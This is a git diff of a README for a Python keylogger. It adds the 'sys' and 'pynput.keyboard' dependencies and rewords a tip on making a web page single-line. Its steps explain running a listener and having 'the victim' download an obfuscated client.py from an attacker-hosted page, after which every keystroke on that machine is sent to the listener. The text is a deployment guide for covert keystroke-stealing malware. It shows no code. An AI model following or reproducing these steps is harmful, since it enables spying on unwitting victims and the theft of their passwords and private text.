@@ -17,6 +17,8 @@ Once the connection is established, every key pressed on the client machine will
   - sockets
   - logging
   - http.server
+  - sys
+  - pynput.keyboard
 
 ### Running the keylogger
 1. Clone the repository with git `git clone https://github.com/o7raven/Encryption`
@@ -27,9 +29,9 @@ Once the connection is established, every key pressed on the client machine will
 6. Let the victim download `client.py` in an executable obfuscated form from the website created by the server
 7. Run `python client.py` on the client machine. This will connect to the listener and establish a connection
 
-### Additional files
+### Additional info
 
-In addition to the main files, there are also two template files for the website: `index.html` and `styles.css`. These can help you to build the page and later convert to a single-line code using [lingojam](https://lingojam.com/TexttoOneLine)
+If you want to change the appearance of a web page or create a completely new one, insert your index.html into [lingojam](https://lingojam.com/TexttoOneLine) to make it single-row
 
 ## Note
 
